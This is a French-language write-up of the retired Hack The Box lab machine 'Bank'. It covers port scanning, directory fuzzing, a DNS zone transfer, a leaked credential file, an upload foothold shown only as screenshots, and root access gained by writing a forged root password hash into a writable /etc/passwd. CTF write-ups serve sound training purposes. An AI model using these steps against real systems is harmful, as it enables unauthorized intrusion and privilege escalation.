
| Room                                 | Bank                                     |
| ------------------------------------ | ---------------------------------------- |
| Url                                  | https://app.hackthebox.com/machines/Bank |
| Sujets                               | Linux                                    |
| Active/Retired lors de la résolution | Retired                                  |
| Difficulté                           | Easy                                     |

---
### Nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 ssh-hostkey: 
   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
 ssh-dss AAAAB3NzaC1kc3MAAACBAMJ+YATka9wvs0FTz8iNWs6uCiLqSFhmBYoYAorFpozVGkCkU1aEJ7biybFTw/qzS9pbSsaYA+3LyUyvh3BSPGEt1BgGW/H29MuXjkznwVz60JqL4GqaJzYSL3smYYdr3KdJQI/QSvf34WU3pife6LRmJaVk+ETh3wPclyecNtedAAAAFQC1Zb2O2LzvAWf20FdsK8HRPlrx1wAAAIBIBAhLmVd3Tz+o+6Oz39g4Um1le8d3DETINWk3myRvPw8hcnRwAFe1+14h3RX4fr+LKXoR/tYrI138PJyiyl+YtQWhZnJ7j8lqnKRU2YibtnUc44kP9FhUqeAcBNjj4qwG9GyQSWm/Q5CbOokgaa6WfdcnwsUMim0h2Ad8YdU1kAAAAIBy3dOOD8jKHeBdE/oXGG0X9tKSFZv1gPr/kZ7NfqUF0kHU3oZTNK8/2qR0SNHgrZ2cLgKTIuneGS8lauXjC66NNMoUkJcMHpwRkYC0A86LDmhES6OuPsQwAjr1AtUZn97QjYu1d6WPfhTdsRYBuCotgKh2SBkzV1Bcz77Tnp56JA==
   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc0rofjHtpSlqkDjjnkEiYcbUrMH0Q4a6PcxqsR3updDGBWu/RK7AGWRSjPn13uil/nl44XF/fkULy7FoXXskByLCHP8FS2gYJApQMvI9n81ERojEA0NIi6VZKP19bl1VFTk7Q5rEPIpab2xqYMBayb1ch7iP95n3iayvHEt/7cSTsddGWKeALi+rrujpnryNViiOIWpqDv+RWtbc2Wuc/FTeGSOt1LBTbtKcLwEehBG+Ym8o8iKTd+zfVudu7v1g3W2Aa3zLuTcePRKLUK3Q2D7k+5aJnWrekpiARQm3NmMkv1NuDLeW3amVBCv6DRJPBqEgSeGMGsnqkR8CKHO9/
   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH30xnPq1XEub/UFQ2KoHXh9LFKMNMkt60xYF3OrEp1Y5XQd0QyeLXwm6tIqWtb0rWda/ivDgmiB4GzCIMf/HQ=
   256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA8MYjFyo+4OwYGTzeuyNd998y6cOx56mIuciim1cvKh
53/tcp open  domain  syn-ack ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
 dns-nsid: 
_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
_http-title: Apache2 Ubuntu Default Page: It works
_http-server-header: Apache/2.4.7 (Ubuntu)
 http-methods: 
 Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
### Enumération

```bash
pak@laptop:~/Téléchargements$ feroxbuster -u http://10.129.29.200

by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.29.200
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       14l       74w     6216c http://10.129.29.200/icons/ubuntu-logo.png
200      GET      378l      980w    11510c http://10.129.29.200/
404      GET        9l       33w      290c http://10.129.29.200/Web%20References
404      GET        9l       33w      285c http://10.129.29.200/Home%20Page
404      GET        9l       33w      290c http://10.129.29.200/Press%20Releases
404      GET        9l       33w      284c http://10.129.29.200/Site%20Map
404      GET        9l       34w      292c http://10.129.29.200/Life%20Income%20Gift
404      GET        9l       33w      286c http://10.129.29.200/New%20Folder
404      GET        9l       33w      287c http://10.129.29.200/Site%20Assets
[####################] - 2m     30005/30005   0s      found:9       errors:0      
[####################] - 2m     30000/30000   306/s   http://10.129.29.200/
```

```bash
pak@laptop:~/Téléchargements$ dig axfr bank.htb @10.129.29.200 

; <<>> DiG 9.19.21-1-Debian <<>> axfr bank.htb @10.129.29.200
;; global options: +cmd
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.129.29.200
ns.bank.htb.		604800	IN	A	10.129.29.200
www.bank.htb.		604800	IN	CNAME	bank.htb.
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 6 604800 86400 2419200 604800
;; Query time: 319 msec
;; SERVER: 10.129.29.200#53(10.129.29.200) (TCP)
;; WHEN: Tue Apr 02 13:23:23 CEST 2024
;; XFR size: 6 records (messages 1, bytes 171)
```

Après un fuzzing des répertoire, on trouve :

```
http://bank.htb/balance-transfer/?C=S;O=A
```

Dont le fichier :

```
http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

---
### Foothold

![Pasted image 20240402215638](../../../Files/Pasted%20image%2020240402215638.png)

Sur la page de support il est possible d'uploader un fichier, et nous voyons ce message dans le code source :

![Pasted image 20240402221807](../../../Files/Pasted%20image%2020240402221807.png)

![Pasted image 20240402221851](../../../Files/Pasted%20image%2020240402221851.png)

---
### Privesc

Après un linpeas, on se rend compte que nous pouvons écrire sur /etc/passwd... La box est donc terminée :

```bash
pak@Desktop:~/Downloads$ openssl passwd pakpak123
$1$7cJ.UgUN$wmzg9LUwJJwxVh5Am4MR70
```

```bash
root:$1$7cJ.UgUN$wmzg9LUwJJwxVh5Am4MR70:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
chris:x:1000:1000:chris,,,:/home/chris:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:112::/var/cache/bind:/bin/false
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
```

```bash
(remote) www-data@bank:/tmp$ su
Password: 
root@bank:/tmp# cd /root
root@bank:~# ls
root.txt
```

